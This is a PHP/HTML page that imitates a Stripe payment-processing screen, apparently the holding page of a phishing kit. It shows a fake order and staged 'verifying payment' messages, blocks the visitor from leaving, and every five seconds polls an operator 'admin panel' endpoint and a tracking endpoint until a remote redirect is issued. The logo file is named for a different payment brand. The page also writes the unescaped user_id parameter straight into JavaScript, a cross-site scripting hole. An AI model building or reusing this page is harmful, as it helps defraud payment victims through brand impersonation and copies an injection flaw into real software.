<?php
$user_id = $_GET['user_id'] ?? '';
if (!$user_id) {
    // Redirect to index if no user_id
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="google" content="notranslate">
    <title>Processing Payment</title>
    <link rel="shortcut icon" href="assets/imgs/favicon.ico">
    <style>
        /* Stripe-like design */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f6f9fc;
            color: #32325d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .stripe-container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            padding: 40px;
            text-align: center;
        }
        
        .stripe-header {
            margin-bottom: 32px;
        }
        
        .stripe-logo {
            width: 120px;
            margin: 0 auto 24px;
        }
        
        .stripe-logo img {
            height: 32px;
            width: auto;
            max-width: 150px;
        }
        
        .stripe-title {
            font-size: 20px;
            font-weight: 600;
            color: #32325d;
            margin-bottom: 8px;
        }
        
        .stripe-subtitle {
            font-size: 15px;
            color: #6b7c93;
            line-height: 1.5;
        }
        
        /* Stripe spinner */
        .stripe-spinner {
            width: 48px;
            height: 48px;
            margin: 0 auto 32px;
            position: relative;
        }
        
        .stripe-spinner-circle {
            width: 100%;
            height: 100%;
            border: 3px solid #e6ebf1;
            border-top-color: #635bff;
            border-radius: 50%;
            animation: stripe-spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        
        @keyframes stripe-spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        /* Order info */
        .order-info {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            margin: 32px 0;
            text-align: left;
        }
        
        .order-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 14px;
        }
        
        .order-row:last-child {
            margin-bottom: 0;
        }
        
        .order-label {
            color: #6b7c93;
        }
        
        .order-value {
            color: #32325d;
            font-weight: 500;
        }
        
        .amount-highlight {
            font-size: 24px;
            font-weight: 600;
            color: #32325d;
            margin: 4px 0;
        }
        
        /* Progress text */
        .progress-text {
            font-size: 14px;
            color: #6b7c93;
            margin-top: 24px;
            min-height: 24px;
        }
        
        .progress-dots {
            display: inline-block;
            animation: dots 1.5s steps(4, end) infinite;
        }
        
        @keyframes dots {
            0%, 20% {
                content: ".";
            }
            40% {
                content: "..";
            }
            60%, 100% {
                content: "...";
            }
        }
        
        /* Status message */
        .status-message {
            font-size: 14px;
            color: #6b7c93;
            margin-top: 16px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 6px;
            border-left: 3px solid #635bff;
        }
        
        .status-message strong {
            color: #32325d;
        }
        
        /* Mobile responsive */
        @media (max-width: 480px) {
            .stripe-container {
                padding: 24px;
            }
            
            .stripe-title {
                font-size: 18px;
            }
            
            .stripe-subtitle {
                font-size: 14px;
            }
            
            .order-info {
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="stripe-container">
        <div class="stripe-header">
            <div class="stripe-logo">
                <img src="assets/imgs/remitly.jpg" alt="Secured by Stripe">
            </div>
            <h1 class="stripe-title">Processing your payment</h1>
            <p class="stripe-subtitle">Please wait while we securely process your transaction</p>
        </div>
        
        <!-- Loading spinner -->
        <div class="stripe-spinner" id="spinner">
            <div class="stripe-spinner-circle"></div>
        </div>
        
        <!-- Order information -->
        <div class="order-info" id="orderInfo">
            <div class="order-row">
                <span class="order-label">Product</span>
                <span class="order-value" id="productName">Niche AI Coach Blueprint</span>
            </div>
            <div class="order-row">
                <span class="order-label">Order ID</span>
                <span class="order-value" id="orderId">ORD-<span id="randomId"></span></span>
            </div>
            <div class="amount-highlight" id="orderAmount">€11.00</div>
        </div>
        
        <!-- Progress text -->
        <p class="progress-text" id="progressText">
            Verifying payment details<span class="progress-dots"></span>
        </p>
        
        <!-- Status message -->
        <div class="status-message" id="statusMessage">
            <strong>Do not close this window</strong> or refresh the page. Your payment is being verified.
        </div>
    </div>
    
    <script>
        const userID = "<?php echo $user_id; ?>";
        
        // Only 3 progress messages
        const progressMessages = [
            "Verifying payment details",
            "Checking account balance", 
            "Finalizing authorization"
        ];
        
        let messageIndex = 0;
        
        function processPayment() {
            // Generate random order ID
            function generateOrderId() {
                return Math.random().toString(36).substr(2, 8).toUpperCase();
            }
            
            // Set random order ID
            document.getElementById('randomId').textContent = generateOrderId();
            
            const progressText = document.getElementById('progressText');
            const statusMessage = document.getElementById('statusMessage');
            
            // Change progress message 3 times, then stop at 3rd message
            const messageInterval = setInterval(() => {
                if (messageIndex < progressMessages.length) {
                    progressText.innerHTML = `${progressMessages[messageIndex]}<span class="progress-dots"></span>`;
                    messageIndex++;
                    
                    // Stop after 3rd message
                    if (messageIndex >= progressMessages.length) {
                        clearInterval(messageInterval);
                    }
                }
            }, 4000);
            
            // Update status message after some time
            setTimeout(() => {
                statusMessage.innerHTML = '<strong>Please continue waiting</strong>. Payment verification is in progress.';
            }, 12000);
            
            // Final update
            setTimeout(() => {
                statusMessage.innerHTML = '<strong>Verification is taking longer than expected</strong>. Please wait.';
            }, 25000);
            
            // Prevent leaving page warning
            window.addEventListener('beforeunload', (event) => {
                event.preventDefault();
                event.returnValue = 'Your payment is still being verified. Are you sure you want to leave?';
            });
            
            // Check admin panel every 5 seconds
            async function checkUserStatus() {
                try {
                    const response = await fetch(`check.php?user_id=${encodeURIComponent(userID)}&page=waitingPay.php`);
                    const data = await response.json();
                    
                    if (data.shouldRedirect && data.redirectTo) {
                        // Update status before redirect
                        await fetch('track.php', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                user_id: userID,
                                last_seen: Math.floor(Date.now() / 1000),
                                status: data.status
                            })
                        });
                        
                        window.location.href = data.redirectTo;
                        return true;
                    }
                    
                    // Update last seen time
                    await fetch('track.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            user_id: userID,
                            last_seen: Math.floor(Date.now() / 1000)
                        })
                    });
                    
                    return false;
                } catch (error) {
                    console.log('Status check failed:', error);
                    return false;
                }
            }
            
            // Start checking every 5 seconds
            const checkInterval = setInterval(async () => {
                const shouldRedirect = await checkUserStatus();
                if (shouldRedirect) {
                    clearInterval(checkInterval);
                    clearInterval(messageInterval);
                }
            }, 5000);
            
            // Initial check
            checkUserStatus();
        }
        
        // Start when page loads
        document.addEventListener('DOMContentLoaded', processPayment);
    </script>
</body>
</html>